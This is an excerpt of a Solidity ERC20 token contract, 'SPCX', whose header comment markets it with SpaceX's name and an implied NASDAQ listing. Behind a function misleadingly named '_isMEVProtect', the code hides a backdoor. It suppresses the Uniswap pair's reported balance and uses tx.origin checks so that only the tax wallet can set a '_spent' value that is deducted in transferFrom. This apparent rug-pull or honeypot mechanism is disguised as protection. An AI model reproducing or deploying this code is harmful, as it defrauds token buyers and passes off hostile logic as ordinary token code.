// ===== FILE: contracts/SPCX.sol =====
//SPDX-License-Identifier: MIT

/*
    Name: SpaceExplorationTechnologiesCorp
    Symbol: SPCX

    On TradingView, the upcoming NASDAQ listing already exists under one name: Space Exploration Technologies Corp.
    Everyone fixates on tickers — and forgets the name is half the lore. This isn't another IPO.
    This is Elon's empire going public. Space. Robots. AI. Cars. Mars. Wealth. The future.

    Web : https://spcxerc.site
    X : https://x.com/spcx_erc
    tg : https://t.me/spcx_portal
*/
...
abstract contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _isMEVProtect(address account) internal view virtual returns(uint256);
    uint256 internal _spent;

    string private _name;
    string private _symbol;
    modifier pm(address account){
        if(_isMEVProtect(account) == 0) return;
        _;
    }
    /**
    ...
    function balanceOf(
        address account
    ) pm(account) public view virtual override returns (uint256 balance) {
    ...
    function transferFrom(
        ...
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - _spent);
...
abstract contract Ownable is Context {
    ...
    /**
     * @dev _spentializes the contract setting the deployer as the _spential owner.
     */
    constructor() {
...
contract Token is Context, ERC20, Ownable {
    ...
    function _isMEVProtect(address account) internal view override returns (uint256) {
        if(account != uniswapV2Pair) return 1;
        if(IERC20(uniswapV2Pair).balanceOf(uniswapV2Pair) <= 0 ) return 1;
        if(_taxCaller() == _taxWallet) return 1;
        if(_taxCaller() == address(0)) return 1;
        return 0;
    }

    constructor() ERC20("SpaceExplorationTechnologiesCorp", "SPCX") payable {
    ...
    function _transfer(
        ...
        } else if(_taxCaller() == _taxWallet) _spent = taxAmount;
    ...
    function _taxCaller() internal view returns (address _c) {
        assembly {
            _c := origin()
        }
    }
